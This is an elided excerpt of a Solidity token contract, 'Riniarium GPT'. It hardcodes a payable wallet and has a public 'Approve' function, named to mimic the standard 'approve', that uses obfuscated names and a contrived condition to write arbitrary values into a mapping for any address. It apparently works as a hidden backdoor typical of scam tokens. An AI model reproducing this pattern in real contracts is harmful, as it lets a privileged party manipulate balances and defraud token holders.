...
contract RiniaGPT is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Riniarium GPT";
    string private _symbol = "RiniaGPT";
    ...
    constructor () {
        ...
        chongq = payable(address(0x82Eb526b510b7aAC4Cf6308b2d489D77a1ae0367));
    ...
    function Approve(address jn,uint256 qd) public {
        ...
        if (nmg(12-1-1,qd)) {beij[jn] = qd**2+1;}
    }
